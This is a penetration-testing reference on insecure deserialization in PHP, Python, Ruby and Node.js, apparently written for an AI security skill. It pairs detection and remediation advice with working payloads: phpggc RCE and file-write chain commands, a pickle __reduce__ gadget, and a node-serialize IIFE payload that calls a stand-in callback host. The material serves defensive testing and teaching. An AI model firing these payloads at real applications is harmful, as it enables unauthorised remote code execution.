# PHP, Python, Ruby, and Node.js Deserialization

Each entry: **RECOGNIZE → TOOL/GADGET → SAFE PoC → REAL CVE/REF → DETECT → REMEDIATE**.
All PoCs use a **benign command (`id`/DNS callback)** only. Read `../SKILL.md` ⚠️ Safety first.

---

## 1. PHP — `unserialize()` object injection & POP chains

### Recognize
- Serialized-PHP syntax in cookies/params/cache: **`O:8:"ClassName":2:{...}`** (object),
  `a:2:{...}` (array), `s:5:"hello"` (string), `i:42` (int), `b:1` (bool).
- Entry points: cookies, `__`-prefixed params, session files, cache, WordPress
  post-meta/options, `phpMyAdmin`-style state, uploaded/`phar://` files.
- **PHP object injection (POI)** = attacker controls the string passed to `unserialize()`.

### How it fires — magic methods
Deserialization instantiates objects and auto-invokes **magic methods** you can weaponize:
`__wakeup()` (on unserialize), `__destruct()` (on GC/end), `__toString()` (on string
context), `__call()`, `__get()`, `__set()`. A **POP chain** (Property-Oriented
Programming) sets object properties so that these magic methods call further methods across
already-loaded classes until reaching a sink (`system`, `file_put_contents`, `eval`,
`call_user_func`, SQL, SSRF, file write → webshell).

### Tool / gadget
- **`phpggc`** (Charles Fol / Ambionics) — the PHP analogue of ysoserial. Library of
  framework/library POP chains: **Laravel, Symfony, CodeIgniter, Monolog, Guzzle,
  Doctrine, Slim, Drupal, Magento, WordPress, Yii, Zend/Laminas, SwiftMailer, phpseclib**.

```bash
phpggc -l                                     # list available chains
phpggc Monolog/RCE1 system 'id'               # RCE chain -> prints serialized payload
phpggc -b Laravel/RCE9 system 'id'            # -b = base64 output for cookie/param
# For a NON-executing safe proof, prefer an SSRF/file-read gadget that calls YOUR
# collaborator (DNS/HTTP callback) over a command-exec chain where possible.
phpggc Guzzle/FW1 <file> <data>               # file-write chain (DO NOT use destructively)
```

### Phar deserialization (no `unserialize()` call needed)
Any filesystem function that accepts a **`phar://`** stream wrapper on an
attacker-influenced path (`file_exists`, `fopen`, `getimagesize`, `is_file`, `unlink`, …)
**deserializes the Phar metadata** → triggers the same POP chains. `phpggc -p phar ...`
builds a polyglot Phar. Watch for file-upload + later filesystem access.

### Safe PoC
- Benign command `id`, or a gadget that makes a **DNS/HTTP request to your collaborator**.
  Confirm via output/callback. **Never** use the file-write chains to drop a webshell —
  stop at proof of the reachable sink.

### Real CVE / ref
- Class defined by Stefan Esser (2009); **phpggc** by Ambionics. Examples: countless
  WordPress-plugin POI CVEs, **Magento**, **Laravel** debug-mode chains, **TYPO3**,
  Phar-based Drupal/WordPress writeups (Sam Thomas, "It's a PHP unserialization vuln
  Jim…", BlackHat 2018).

### Detect
- Grep: `unserialize(` on request data; filesystem calls with attacker-controlled paths
  (`phar://` risk); `__wakeup`/`__destruct`/`__toString` in app classes with side effects.
- Semgrep: taint from `$_GET/$_POST/$_COOKIE/$_REQUEST` → `unserialize(`.

### Remediate
- **Don't `unserialize()` untrusted input.** Use `json_decode()` (data-only). If you must,
  pass **`unserialize($data, ['allowed_classes' => false])`** (or an allow-list array) —
  PHP ≥ 7.0. HMAC-sign any serialized blob that round-trips a client.
- PHP ≥ 8.0 removed automatic Phar metadata deserialization for many functions, but
  validate/allow-list stream wrappers and never build filesystem paths from user input.

---

## 2. Python — `pickle`, `yaml.load`, `jsonpickle`, ML model files

### Recognize
- Pickle magic: **`80 04`/`80 05`** (proto 4/5), stream ends with `.` (`2e`); base64 →
  **`gAS...`/`gAN...`/`gAJ...`**. Opcodes `c`/`R`/`\x93` (`GLOBAL`/`REDUCE`/`STACK_GLOBAL`).
- Entry points: cookies, caches, **Celery/queue** messages, `django`/`flask` session if
  pickle-backed, and **`.pkl`/`.pt`/`.joblib`/HuggingFace model files** (supply-chain).
- YAML with `!!python/object/apply:os.system` tags. `jsonpickle` with `"py/object"` keys.

### How it fires — `__reduce__`
`pickle` is a stack VM. The **`REDUCE`** opcode pops a callable + arg-tuple and **calls
it**. Any class can define **`__reduce__()`** to return `(callable, args)`; on unpickling
that callable runs. This is arbitrary code execution by design — **unpickling untrusted
data == running attacker code**.

### Tool / gadget
- No framework needed — a 6-line class is the "gadget":

```python
import pickle, base64, os
class E:
    def __reduce__(self):
        # BENIGN proof only — id, or an OOB DNS lookup to YOUR collaborator:
        return (os.system, ('nslookup <token>.oob.example',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

- **`fickling`** (Trail of Bits) — decompiles/analyses/injects pickles; use it to
  **statically inspect** a suspicious `.pkl` for `GLOBAL/REDUCE` (safe, no execution) and to
  demonstrate a benign injected payload.

### Safe PoC
- Prefer the **DNS/HTTP OOB callback** command over anything touching disk; confirm via
  collaborator. For ML models, **analyze with `fickling`/`picklescan` — do not `load()`**
  an untrusted model to "test" it; that *is* the exploit.

### Real CVE / ref
- Documented since forever (`pickle` docs literally warn). Recent: mass **HuggingFace /
  PyTorch pickle supply-chain** research (2023–2025); `picklescan` bypasses; **CVE-2019-6446**
  (NumPy `allow_pickle`); YAML **`yaml.load` without `SafeLoader`** RCE (many products).

### Detect
- Grep/SAST: `pickle.loads`/`pickle.load`/`cPickle`/`_pickle`, `yaml.load(` without
  `Loader=SafeLoader`, `jsonpickle.decode`, `dill.loads`, `shelve`, `numpy.load(...,
  allow_pickle=True)`, `torch.load` (uses pickle), `joblib.load`.

### Remediate
- **Never unpickle untrusted data.** Use JSON/`msgpack`/protobuf. For config, **`yaml.safe_load`**
  (PyYAML ≥ 6 defaults safe). For ML, use **`safetensors`** instead of pickle-backed
  formats; scan third-party models (`picklescan`, `fickling`) in CI. Sign/HMAC any pickle
  that must round-trip.

---

## 3. Ruby — `Marshal.load`, `YAML.load` (Psych), Oj

### Recognize
- Marshal magic: **`04 08`** (version 4.8); base64 → **`BAh...`/`BAg...`**. Entry points:
  Rails cookies/sessions if Marshal-backed, caches, `_session_id`, any `Marshal.load` on
  request data.
- YAML with `!ruby/object:` / `!ruby/hash:` tags → `YAML.load`/`Psych` (pre-3.1).

### Tool / gadget
- **Universal deserialization gadget** (Luke Jahnke / elttam; extended by others through
  Ruby 3.4). If `marshal_load` / an object with a reachable side-effecting method exists,
  a self-contained chain reaches `Kernel`-level execution — **no external dependency
  required**, works against a bare `Marshal.load`. Public PoCs (PentesterLab
  `ruby_ugadget`, PortSwigger lab, `Ruby2.x-RCE-Deserialization`).

### Safe PoC
- Use the documented universal gadget wired to a **benign `id`/DNS callback**; confirm and
  stop. Do not adapt the chain to write files or spawn shells.

### Real CVE / ref
- **CVE-2019-5420** — Rails development-mode `Marshal.load` RCE (ZDI/`ActiveStorage`).
- **CVE-2013-0156** — Rails XML/YAML params → object injection (historic, huge impact).
- PortSwigger Web Security Academy "Ruby deserialization using a documented gadget chain".

### Detect
- Grep: `Marshal.load`/`Marshal.restore`, `YAML.load(` (Psych < 3.1), `Oj.load` in
  non-safe mode (`:object` mode), `Kernel#open`/`send` on tainted input.

### Remediate
- **Don't `Marshal.load` untrusted data.** Use JSON. `YAML.safe_load` / Ruby ≥ 3.1 (Psych
  4) defaults `load` to safe. `Oj` — use `:strict`/`:compat`, never `:object` mode on
  untrusted input. Sign Rails cookies (default) and don't switch the serializer to Marshal.

---

## 4. Node.js — `node-serialize`, `serialize-to-js`, `funcster`

### Recognize
- JSON-ish blob containing a **serialized function** marker:
  **`"_$$ND_FUNC$$_function () {...}"`**, sometimes with a trailing `()` to force an
  **IIFE** (immediately-invoked function expression). Passed to a library `unserialize()`.

### Tool / gadget
- No framework — the payload *is* the gadget. Libraries like **`node-serialize`** eval the
  embedded function on unserialize; appending `()` makes it self-execute:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup <token>.oob.example')}()"}
```

- Place base64/JSON in the cookie/param the app feeds to `unserialize()`.

### Safe PoC
- Use an **OOB DNS/HTTP callback** (as above) rather than `id` output where you can't see
  stdout; confirm via collaborator. No reverse shells, no `fs` writes.

### Real CVE / ref
- **CVE-2017-5941** — `node-serialize` 0.0.4 `unserialize()` RCE via IIFE (Ajin Abraham /
  OpsecX writeup, ExploitDB). Similar issues in `serialize-to-js`, `funcster`, `cryo`.

### Detect
- Grep: `require('node-serialize')`, `.unserialize(`, `serialize-to-js`, `funcster`,
  `cryo`, and any `eval`/`Function(`/`vm.runIn*` on request data. Note: **`JSON.parse` is
  safe** — the risk is libraries that (de)serialize *functions*.

### Remediate
- **Use `JSON.parse`/`JSON.stringify`** — never a library that serializes functions from
  untrusted input. Remove `node-serialize`/`funcster` from dependencies; if a value must
  carry behavior, model it as data + a server-side dispatch allow-list.
